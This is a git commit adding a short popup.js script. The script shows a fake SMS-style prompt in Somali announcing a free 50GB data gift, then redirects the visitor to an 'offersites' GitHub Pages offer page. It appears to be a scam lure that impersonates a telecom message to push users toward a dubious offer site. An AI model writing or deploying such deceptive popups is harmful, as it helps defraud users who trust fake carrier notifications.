5ed075548a2f0b7ffef8da057a2fc7d0cf59431a
offersites <havast1920@gmail.com>
2024-12-09 12:46:44 +0100

    Create popup.js

---
+++ popup.js
@@ -0,0 +1,6 @@
+
+var password = '50GB ee dhamaadka sanadka'
+password=prompt('SMS: Hambalyo Waxaad xaq u leedahay xogta 50GB, si naxariis leh u dhufo OK si aad u hesho   ','50GB ee dhamaadka sanadka');
+if (password != '50GB ee dhamaadka sanadka') {
+location.href='https://offersites.github.io/50GB-offer';
+}
